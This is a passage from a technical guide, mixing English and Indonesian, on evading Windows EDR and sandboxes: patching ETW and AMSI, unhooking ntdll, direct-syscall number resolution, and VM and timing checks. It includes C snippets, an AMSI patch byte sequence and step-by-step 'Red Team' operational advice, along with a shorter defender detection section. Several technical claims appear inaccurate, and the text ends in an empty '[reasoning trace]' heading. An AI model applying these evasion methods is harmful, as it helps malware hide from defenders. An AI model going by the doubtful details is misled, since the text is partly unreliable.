- `EtwEventWrite` is `forwarded` to `EtwEventWriteFull` and `EtwEventWriteTransfer`. **A single patch on `EtwEventWrite` does not cover `EtwEventWriteFull`** — the .NET runtime calls `EtwEventWriteTransfer` or the `Ex` variant directly. Patch at least three: `EtwEventWrite`, `EtwEventWriteFull`, `EtwEventWriteEx`.
- **Provider-level disable**: `EtwEventRegister` returns a `REGHANDLE` + `ENABLED` flag. Patch `EtwEventRegister` to force `isEnabled = FALSE` on specific providers — more selective and avoids crashes because certain providers (e.g. `Microsoft-Windows-Kernel-Process`) are consumed by a kernel driver (userland patch has no effect).
- **WiFi/Bluetooth telemetry**: `EtwEventWrite` is `NtTraceEvent` via **direct syscall** if the bindiff is compiled with `RtlGetCurrentPeb()->...` — a userland patch does not cover it. This indicates the EDR uses **direct syscalls** to emit telemetry — the trace cannot be safely disabled from userland.

### 8.2 `EtwpEventWriteFull` / `EtwNotificationRegister` Patch (Rarely Documented)

`EtwNotificationRegister` (Win8+) is used by **"modern" ETW** and some EDRs for callback registration. Patch this function to prevent the EDR from registering new callbacks — **but** already-registered callbacks remain active.

**Operational pitfall**: patching `EtwNotificationRegister` by malware is often **logged** by `Microsoft-Windows-Threat-Intelligence` (ETW-TI) which runs in the **kernel** — it cannot be patched from userland. Solution: **do not patch** if ETW-TI is active (detect via `NtQuerySystemInformation(SystemCodeIntegrityInformation)` or check `EtwpGlobalSequenceNumber`, which cannot be modified).

### 8.3 ETW-TI (Threat-Intelligence) — Realitas

ETW-TI (`Microsoft-Windows-Threat-Intelligence`) is a **kernel provider** that emits events for executable `VirtualAlloc`, cross-process `WriteProcessMemory`, `QueueUserAPC`. Known userland mitigations:

| Technique | Effectiveness | Risk |
|---|---|---|
| Patch `EtwEventWrite` | ❌ No (kernel-emit) | — |
| Patch `NtTraceEvent` | ❌ No | — |
| Unhook `ntdll!NtTraceEvent` syscall | ⚠️ Sebagian | BSOD jika patch global |
| Disable via registry `HKLM\...\WINEVT\Channels` | ❌ No (per-consumer) | — |
| Patch consumer (`svchost!Timeline`) | ⚠️ Fragile | restart service |
| **Blind spot**: syscall from user mode via `NtTraceEvent` that is directly `syscall`ed (not IAT) | ✅ If EDR does not hook SSDT | HVCI blocks |

**Operational conclusion**: ETW-TI cannot be bypassed from pure userland. A realistic strategy is to **reduce signals** (`VirtualAlloc` non-exec then `VirtualProtect`, `NtMapViewOfSection` RX, etc.) rather than disable the provider.

## 9. Unhooking ntdll — Advanced Variants

### 9.1 Technique Comparison (Additional Table)

| Technique | Fresh Copy Source | Direct Syscall | EDR Detection | Complexity |
|---|---|---|---|---|
| **Classic unhook** (`CreateFileMapping` + `NtMapViewOfSection` section) | KnownDlls `\KnownDlls\ntdll.dll` | ❌ | ⚠️ Jelas (RWX section, private mapping) | Low |
| **Fresh copy** `LoadLibrary("C:\\Windows\\System32\\ntdll.dll")` | File (KnownDlls-redirected) | ❌ | ⚠️ EDR can hook `LoadLibrary` | Low |
| **Hell's Gate** | N/A (read SSN from original stub) | ✅ | ⚠️ Signature SSN extraction | Medium |
| **Halo's Gate** | Neighbor stub (SSN±1) | ✅ | ✅ More subtle (SSN from neighbor) | Medium |
| **Tartarus Gate** | Neighbor via `jmp` check + up/down | ✅ | ✅ Robust against partial hooks | Medium |
| **SysWhispers 2/3** | Hardcoded SSN table | ✅ | ❌ Static (SSN table per build) | Low |
| **FreshyCalls** | Sort `Zw*` by address, index = SSN | ✅ | ✅ No stub read needed | Medium |
| **RecycledGate** | Same as FreshyCalls + jmp-aware | ✅ | ✅ Robust hook | Medium-High |
| **PerunsFart** | `RtlGetThreadStartAddress` + heap walk | ✅ | ✅ Runtime resolve | High |
| **Syscall via `ntdll` stalk** | Stalk prolog, extract `mov eax, imm` | ✅ | ✅ Tahan hook `jmp` | Medium |

### 9.2 Hell's Gate — Edge Case Terbaru

**Problem**: Modern EDRs (CrowdStrike Falcon, SentinelOne) hook with a **5-byte `jmp`** at the start of a function — `mov eax, SSN` becomes `E9 xx xx xx xx`, so reading `[p+4] == 0xB8` fails. This triggers **Hell's Gate failure** → crash.

**Halo's Gate** (neighbor): if stub `p` is hooked, look for `p-1` (previous) or `p+1`. SSN = SSN_neighbor ∓ 1. **Edge case**: on Windows 11 with a **branched hook chain** (EDR hook interleaved with AMSI/manual-mapped), the neighbor can also be hooked → cascading failure wave.

**Tartarus Gate** (fix): check `jmp` target. If the stub contains `E9`, follow the target (likely an EDR trampoline) — the trampoline usually preserves the original `mov eax, SSN` after the `jmp` returns. If not, use a neighbor with direction based on the sorted `Zw*` address order.

```c
// Tartarus-inspired: sort exports, cari berdasarkan relasi alamat
// Pada ntdll, SSN berkorelasi monoton dengan alamat fungsi (di-sort).
// Jika stub di-hook, ambil SSN dari fungsi tetangga, koreksi offset.
DWORD TartarusSSN(PVOID funcAddr) {
    // 1) cek langsung
    if (((PBYTE)funcAddr)[0] == 0x4C && ((PBYTE)funcAddr)[1] == 0x8B &&
        ((PBYTE)funcAddr)[2] == 0xD1 && ((PBYTE)funcAddr)[3] == 0xB8)
        return *(DWORD*)((PBYTE)funcAddr + 4);
    // 2) cek jmp target
    if (((PBYTE)funcAddr)[0] == 0xE9) {
        DWORD rel = *(DWORD*)((PBYTE)funcAddr + 1);
        PBYTE target = (PBYTE)funcAddr + 5 + rel;
        // target trampoline: mungkin berisi mov eax, SSN lalu jmp balik
        if (target[0] == 0xB8) return *(DWORD*)(target + 1);
    }
    // 3) neighbor walk dengan arah
    // (implementasi enumerasi export lalu cari alamat terdekat yang valid)
    return 0xFFFFFFFF;
}
```

### 9.3 FreshyCalls & RecycledGate — Resolve Without Reading Stub

Insight: in `ntdll`, `Zw*` exports are sorted by address = monotonic SSN. Resolve SSN = index in the sorted array + base.

```
1. Enum export directory ntdll (parse PE header manual — hindari GetProcAddress yang di-hook)
2. Filter nama berawalan "Zw"
3. Sort berdasarkan address (bukan nama)
4. SSN = index + baseSSN (baseSSN di-tuning per Windows build, atau di-resolve dari satu stub known-good)
```

**RecycledGate** adds: validate that the stub is not hooked via a `jmp` check; if so, use a neighbor with **corrected index**.

**Jebakan**:
- **Kernel 24H2 (build 26100)**: ntdll is re-`link`ed; the `Zw*` order remains monotonic but **baseSSN shifts** because new syscalls are inserted. `FreshyCalls` must resolve baseSSN from one unhooked stub (e.g. `NtQuerySystemTime` — usually not hooked because it is not sensitive).
- **EDR hook on sorted array**: some modern EDRs move the `Zw*` stub to a **different section** (`.mrdata` vs `.text`) so sorting by address remains correct, but if the EDR copies the stub to a trampoline, the address order in `.text` is no longer monotonic. **Solution**: sort by **name** and batch with `NtQueryInformationProcess` for validation — or use a `Hell's Gate` hybrid for doubtful stubs.

### 9.4 Direct Syscall — Deteksi & Edge Case

**Deteksi EDR** (System call origin check):
- **`Thread.ProcessId` in syscall chain**: kernel ETW-TI emits `SysCallEnter` with `CallStack`. EDR detects `NtProtectVirtualMemory` called from an address **not** in ntdll `.text` → alert.
- **Indirect syscall** (SysWhispers 3 / `JumpToSyscall`): `jmp ntdll!Nt*` with `syscall` elsewhere. EDR detects via **unwind info** mismatch or `RtlVirtualUnwind` mismatch.
- **Mitigation**: **`NtCreateThreadEx` to a syscall gadget from `win32u` / `wow64cpu`** (halo's gate variant — the syscall instruction in `win32u.dll` is rarely hooked).

**Edge case penting (2024)**:
- **`Wow64`**: 32-bit processes on a 64-bit OS perform thunking. Direct syscall from `wow64cpu.dll` has a stub that is **recognized** by EDR as legit — the historical trick was to **inject into a WOW64 process** and call via `KiFastSystemCall`. This technique is now **detected** because Microsoft moved thunking to the `wow64` subsystem with ETW events.
- **`syscall` instruction in HVCI**: syscall from user mode is still allowed, but **SSDT patching is not possible** — not relevant for userland bypass.
- **`NtCreateThreadEx` + `RtlCreateUserThread`**: both trigger ETW-TI `RemoteThread` event. Use `NtQueueApcThreadEx` to a thread that is already `alertable` — APC events are now also emitted (Win11 22H2+). **There is no remote injection without ETW-TI on modern Windows 11**.

## 10. EDR Userland Hook Detection — Detection for Attackers

### 10.1 Self-Check: Deteksi Hook oleh EDR

Before unhooking, verify whether a hook exists (prevents excessive unhooking that causes integrity detection):

```c
BOOL IsHooked(PVOID pFunc) {
    PBYTE b = (PBYTE)pFunc;
    // Legit ntdll stub prolog: 4C 8B D1 B8 <ssn> ... (x64)
    // atau 48 83 EC 28 ... (wrapper)
    // Hook: E9 xx xx xx xx / FF 25 / int3 / 48 B8 <addr> (mov rax, imm64 + jmp rax)
    if (b[0] == 0xE9) return TRUE;             // jmp rel32
    if (b[0] == 0xFF && b[1] == 0x25) return TRUE;  // jmp [rip+disp]
    if (b[0] == 0xCC) return TRUE;             // int3
    if (b[0] == 0x48 && b[1] == 0xB8 && b[10] == 0xFF) return TRUE; // mov rax; jmp rax
    return FALSE;
}
```

**Limitation**: EDR "stealth" hooks (inline in the middle of a function, after the prolog — detour by [Minhook](https://github.com/TsudaKageyu/minhook) or [Detours](https://github.com/microsoft/Detours) with `VirtualProtect` on the body) are **not detected** by prolog check. Alternative: compare ntdll `.text` in memory with the file on disk (checksum per section), or `NtReadVirtualMemory` from `\KnownDlls`.

### 10.2 Deteksi Hook via Cross-Process Compare

Reading ntdll from **another** process (e.g. a Windows process not yet injected by EDR — `smss.exe`, `csrss.exe`) then compare `.text` bytes:

```c
// 1. Buka smss.exe (PPID system, biasanya tanpa EDR hook)
// 2. NtReadVirtualMemory(ntdllBase, .text, size) -> freshText
// 3. Bandingkan dengan ntdll lokal -> diff = hook region
```

**Pitfall**: modern EDR (Microsoft Defender for Endpoint 2023+) performs **Cross-Process Injection** into `smss.exe`, `lsass.exe`, `csrss.exe` — all are hooked. Comparing with an EDR child process will give a false negative. Use the **`\KnownDlls\ntdll.dll` section** via `NtOpenSection` + `NtMapViewOfSection(SEC_IMAGE)` — this mapping is **read-only and immutable** (kernel-backed image section), not hooked.

### 10.3 Hook Detection via `PAGE_GUARD` and `PAGE_EXECUTE_READWRITE` Scan

Scan the `.text` section of ntdll for regions with **RWX** permission (EDR trampolines are typically RWX or RX outside the image range):

```c
MEMORY_BASIC_INFORMATION mbi;
for (PBYTE p = ntdllBase; p < ntdllEnd; p += mbi.RegionSize) {
    VirtualQuery(p, &mbi, sizeof(mbi));
    if ((mbi.Protect & 0xFF) == PAGE_EXECUTE_READWRITE) { /* hook trampoline */ }
    if (mbi.State == MEM_COMMIT && !(mbi.Type & MEM_IMAGE)) { /* manual map */ }
}
```

## 11. Sandbox Evasion — Advanced Variants

### 11.1 Sleep Acceleration — Deteksi & Counter

Classic technique: `NtDelayExecution(10000 * 10000000)` (1000 seconds) then run normally — sandboxes patch `Sleep`/`NtDelayExecution` to "fast-forward". Detect with a **timing check**:

```c
LARGE_INTEGER t1, t2, freq;
QueryPerformanceCounter(&t1);
LARGE_INTEGER delay = {.QuadPart = -(5LL * 10000000)}; // 5s
NtDelayExecution(FALSE, &delay);
QueryPerformanceCounter(&t2);
QueryPerformanceFrequency(&freq);
double elapsed = (double)(t2.QuadPart - t1.QuadPart) / freq.QuadPart;
if (elapsed < 4.9) { /* accelerated — sandbox */ }
```

**Varian mutakhir**:
- **`Sleep` via `WaitForSingleObject` on a timeout event** is harder to patch (some sandboxes don't intercept it).
- **`SetTimer` + `MsgWaitForMultipleObjects`** — timer acceleration terdeteksi via `GetTickCount64`.
- **Nested timing**: use 3 parallel timers (`QPC`, `GetTickCount64`, `__rdtsc`) — sandboxes typically patch one, not all. Compare them.
- **`NtQueryTimerResolution` before/after sleep** — a fast-forwarding sandbox temporarily changes the timer resolution.

**Counter from the sandbox** (for defenders): hook `NtDelayExecution` with the **real delay** but **advance the virtual clock** — the QPC clock is also virtualized so the timing check "deceives" the malware.

### 11.2 User Interaction — Varian Terbaru

```c
// Cek input terakhir — trace historis cursor
LASTINPUTINFO lii = {.cbSize = sizeof(lii)};
GetLastInputInfo(&lii);
DWORD idle = GetTickCount() - lii.dwTime;
// Sandbox headless: idle sangat besar (~uptime). Real user: < beberapa menit.
```

**Varian 2024**:
- **Repeated `GetCursorPos`**: sample cursor position every 200ms; if the position is constant and always `(0,0)` or the screen center → headless.
- **`GetForegroundWindow` + `GetWindowText`**: a sandbox without interaction typically keeps `Default IME` / `Progman` in the foreground. A real user has varied foreground windows.
- **`GetSystemMetrics(SM_MOUSEBUTTONS)`** — jika 0 (headless server), curiga. (Rarely effective — nilainya 2 default.)
- **`NtUserGetRawInputData`** — check the raw input buffer; headless without devices doesn't have one.

**Edge case**: modern sandboxes (Any.Run, Joe Sandbox) **simulate** mouse move + click via the hypervisor — the above techniques fail. Variant: check the **entropy** of mouse movement (via a `SetWindowsHookEx(WH_MOUSE_LL)` hook) — humans don't move linearly. **Pitfall**: the HIDLL hook is detected as malware behavior.

### 11.3 Hardware Fingerprint — Varian & Edge Case

| Fingerprint | API | Sandbox Typical Value | False Positive |
|---|---|---|---|
| CPU vendor & count | `__cpuid(0)`, `GetSystemInfo` | "GenuineIntel" + 1–4 core | Server hosting legit |
| CPU brand string | `__cpuid(0x80000002-4)` | "QEMU Virtual CPU", "VirtualBox" | Cloud VPS |
| RAM | `GlobalMemoryStatusEx` | < 2GB (sandbox) | Legacy hardware |
| Disk | `GetDiskFreeSpaceEx`, `DeviceIoControl(IOCTL_STORAGE_QUERY_PROPERTY)` | "QEMU HARDDISK", "VBOX HARDDISK", "Red Hat VirtIO" | — |
| BIOS | `GetSystemFirmwareTable` | "SeaBIOS", "BOCHS", "AMI" (VM) | Legacy real HW (AMI) |
| MAC prefix | `GetAdaptersAddresses` | `08:00:27` (VB), `00:0C:29` (VMware), `00:15:5D` (Hyper-V), `52:54:00` (QEMU) | — |
| GPU | `EnumDisplayDevices` | "Microsoft Basic Display Adapter" | RDP |
| TPM | `TpmIsEnabled` / WMI | Absent | Legacy HW |
| Secure Boot | `GetFirmwareEnvironmentVariable` | Absent | — |
| **`rdtsc` skew** | `__rdtsc` timing | Deteksi VM exit latency | — |
| **`cpuid` hypervisor leaf** | `__cpuid(0x40000000)` | "KVMKVMKVM", "Microsoft Hv", "VMwareVMware" | **Hyper-V on Windows 11 by default** — false positive |

**Edge case baru**:
- **Windows 11 with VBS/HVCI**: `__cpuid(0x40000000)` returns "Microsoft Hv" even on physical hardware — the CPUID hypervisor technique is **obsolete**. Use a combination with `rdtsc` skew **with correction** (VBS skew is small, VM skew is large).
- **Apple Silicon Mac (ARM64 Windows, Parallels)**: the CPUID equivalent (`MRS ID_AA64PFR0_EL1`) returns ARM64 — a strong indicator of VM/emulation for x64-only malware.
- **Cloud (AWS/Azure)**: MAC `02:*:*:*:*:*` (AWS) or `00:0D:3A` (Azure) + SMBIOS `Amazon EC2`/`Microsoft Corporation`. This fingerprint is **system-specific, not sandbox-specific** — many commercial malware whitelist cloud to avoid false-positive detection on enterprise victims. **Pitfall**: malware that rejects cloud will **fail on victims in the cloud** (high miss rate).

### 11.4 Complementary: Timing-Based VM Detection (`rdtsc` diff)

```c
// Deteksi VM exit: instruksi privileged yang memicu VM exit akan jauh lebih lambat
UINT64 t1 = __rdtsc();
__cpuid(...);  // atau instr privileged ring-0
UINT64 t2 = __rdtsc();
if (t2 - t1 > 1000) { /* VM exit */ }
```

**Pitfall**: on a physical machine with SMT active, the diff can be > 1000 due to interrupts/context switches. **Use the median of 100 samples**, and compare with the `rdtsc` baseline (gap between two consecutive `rdtsc`). Ratio > 4–8x → VM.

### 11.5 Sandbox "Anti-VM" — Deteksi oleh Sandbox

Defenders now detect this technique:
- **Static**: signature API call sequence (`__cpuid` + `GlobalMemoryStatusEx` + MAC check) → sandbox "suspicious" flag.
- **Dynamic**: sandboxes `fake` the value (Any.Run "evasion" mode) — if the malware still exits, flag it as anti-sandbox (an indicator of maliciousness).
- **Attacker strategy**: **don't exit prematurely**. Collect fingerprints, store them, but keep running normally — detection by the analyst becomes slower. Or **branch** to "benign" behavior (e.g., calculator) when detected — the analyst gets confused.

## 12. Cross-Technique Operational Pitfalls

### 12.1 Orde Eksekusi

Safe order and rationale:

1. **Fingerprint the env first** (`__cpuid`, SMBIOS) — read-only operations, don't trip ETW-TI.
2. **Sleep acceleration check** — cheapest, not sensitive.
3. **AMSI patch** — before sensitive strings touch PowerShell/.NET; if after, it's too late.
4. **ETW patch** — before `VirtualAlloc`/`VirtualProtect` (which are emitted by ETW-TI). Note: patching ETW does **not** close ETW-TI, so this order only reduces userland noise.
5. **Unhook ntdll** — last before custom syscalls; if done early, self-check hook detection can be wrong because ntdll has already been modified.
6. **Syscall** — all sensitive operations via direct/indirect.

**Common mistakes**: patching AMSI after dropping to disk → AMSI scans the file and detects it. Or unhooking ntdll after the first `VirtualProtect` → the ETW-TI log reports `NtProtectVirtualMemory` from ntdll (but `CallStack` is normal).

### 12.2 Cross-Version Compatibility Matrix

| Technique | Win10 1909 | Win10 22H2 | Win11 22H2 | Win11 24H2 | Server 2019/2022 |
|---|---|---|---|---|---|
| AMSI `AmsiScanBuffer` patch | ✅ | ✅ | ✅ | ✅ | ✅ |
| AMSI Dr register | ✅ | ✅ | ⚠️ (CET) | ⚠️ (HVCI+CET) | ✅ |
| AMSI reflection (PS5) | ✅ | ✅ | ✅ | ⚠️ (signature update) | ✅ |
| AMSI reflection (PS7) | ❌ | ❌ | ❌ | ❌ | ❌ |
| ETW `EtwEventWrite` | ✅ | ✅ | ✅ | ⚠️ (vtable, syscall) | ✅ |
| ETW-TI bypass | ❌ | ❌ | ❌ | ❌ | ❌ |
| ntdll unhook (KnownDlls) | ✅ | ✅ | ✅ | ✅ | ✅ |
| Hell's Gate | ✅ | ✅ | ⚠️ (hook depth) | ⚠️ | ✅ |
| Halo's Gate | ✅ | ✅ | ✅ | ✅ | ✅ |
| Tartarus Gate | ✅ | ✅ | ✅ | ✅ | ✅ |
| FreshyCalls | ✅ | ✅ | ✅ | ⚠️ (base SSN shift) | ✅ |
| Direct syscall | ✅ | ✅ | ⚠️ (ETW-TI CallStack) | ⚠️ | ✅ |
| HWBP ETW | ✅ | ✅ | ✅ | ⚠️ (CET) | ✅ |
| `NtDelayExecution` accel check | ✅ | ✅ | ✅ | ✅ | ✅ |
| CPUID hypervisor leaf | ✅ | ✅ | ❌ (VBS) | ❌ (VBS) | ✅ |

### 12.3 Forensic Logging That Is Often Missed

Every evasion technique leaves traces in unexpected places:

| Aksi | Jejak | Lokasi |
|---|---|---|
| `VirtualProtect` in ntdll/amsi `.text` | `Microsoft-Windows-Threat-Intelligence` event 6 | Kernel → EventLog channel ETW-TI (if consumed) |
| Section mapping `\KnownDlls\ntdll.dll` | `MuiCache`, `Prefetch` entry baru | `NTUSER.DAT`, `Windows\Prefetch` |
| `LoadLibrary` private copy ntdll | `AppCompat` shim cache, `Amcache.hve` | `Amcache.hve`, `Windows\AppCompat\Programs` |
| HWBP set (Dr0) | `Sysmon` Event ID 8 (CreateRemoteThread) sometimes misses, but **Intel PT trace** records it | Kernel (requires Intel PT / ETW capture) |
| Cross-process compare ntdll | `Sysmon` Event ID 10 (ProcessAccess) with `GrantedAccess` = `0x1010` (VM_READ) | Sysmon |
| `__cpuid(0x40000000)` + SMBIOS read | **None** — silent, but **behavioral** (API pattern) is recorded in EDR telemetry | EDR internal |

**Implication**: unhooking and patching do remove userland logs, but **the kernel side still records** (ETW-TI, Sysmon, Intel PT, Hyper-V hypervisor logs). An attacker who successfully bypasses userland is **still detected** by an analyst with access to kernel-level telemetry.

### 12.4 Specific Defender Configurations That Break This Technique

- **Microsoft Defender for Endpoint (MDE) "Tamper Protection" + "Script Scanning"**: blocks `AmsiUtils` reflection (signature `AmsiUtils`/`amsiInitFailed`), `AmsiScanBuffer` patch via ASR (Attack Surface Reduction rule "Block process creations originating from PSExec and WMI"), and ETW patch via **T1562.006** detection (managed).
- **CrowdStrike Falcon "User-Mode Hooking" + "Kernel Sensor"**: patch on ntdll causes **integrity check** via Falcon kernel driver → alert `SuspiciousProcessAccess` (not a block, but log sent). FreshyCalls against ntdll that is `jmp`-ed produces **unwind mismatch** — Falcon detects it as `InvalidUnwindInfo`.
- **SentinelOne "Static AI" + "ARO"**: `Dr0-Dr3` write via `SetThreadContext` is logged by **SentinelOne driver** — triggers alert `HardwareBreakpointSet` (rarely used by legit software).
- **Windows Defender Application Control (WDAC) + HVCI**: `VirtualProtect(PAGE_EXECUTE_READWRITE)` on **image section** ntdll → **HVCI block** (`STATUS_INVALID_PAGE_PROTECTION`). Unhook via `VirtualProtect` ntdll **fails** on HVCI machines — only `NtMapViewOfSection` from a file copy succeeds (because it does not modify the original image section).

### 12.5 Practical Recommendations (For Red Team)

1. **Always fingerprint first** before patching — patching AMSI in a Windows Defender + HVCI sandbox will **crash** the audit process.
2. **Prefer `NtMapViewOfSection` fresh copy** over `VirtualProtect` — saves one ETW-TI call and is HVCI-compatible.
3. **Avoid `Dr0` on HVCI + CET** — use **Veh + inline patch** AMSI (`AmsiScanBuffer` → `mov eax, 0x80070057; ret`) which is more stable across all versions.
4. **Don't unhook all of `ntdll`** — unhook only the needed functions (`NtAllocateVirtualMemory`, `NtProtectVirtualMemory`, `NtWriteVirtualMemory`, `NtCreateThreadEx`). Full unhook triggers integrity check.
5. **For .NET internal**: hook `Assembly.Load` not `AmsiScanBuffer` — more selective, doesn't interfere with scanning other PowerShell files (which may be reported to SOC as "normal").
6. **Test on HVCI-enabled Windows 11 24H2** — many old techniques fail; don't assume compatibility from Win10.

### 12.6 Detection Engineering (For Blue Team on This Side)

Effective signatures to detect the above techniques **without** relying on userland hooks:

- **`LoadLibrary` from path `System32\ntdll.dll`** without `LOAD_LIBRARY_AS_DATAFILE` → suspicious (ntdll is always KnownDlls).
- **`NtMapViewOfSection` with section path `\KnownDlls\`** — legitimate (loader), but **private mapping (SEC_IMAGE)** in a non-loader process → suspicious.
- **`VirtualProtect` that modifies `.text`** (image region, not `MEM_PRIVATE`) → almost always evasion (or hook install by the EDR itself — false positive; whitelist EDR module base address).
- **`SetThreadContext` with `Dr0 != 0`** — very rarely legitimate. Whitelist debuggers (WinDbg, x64dbg).
- **`EtwsEventWrite` returns 0 without an event sent** (comparison with ETW-TI consumer) → indication of patch. Can only be detected by kernel.
- **`__cpuid(0x40000000)` in a non-hypervisor-aware process** → aggressive sample. Whitelist hardware-inventory processes (`msinfo32.exe`, `dxdiag.exe`).

**Key insight**: userland defense evasion does **not** eliminate evidence from kernel telemetry (ETW-TI, HVCI, Hyper-V). Blue team investment is better spent on **kernel-side detection** than on userland hooks that can be bypassed. This is a fundamental industry shift of 2023–2025.


---

## [reasoning trace]


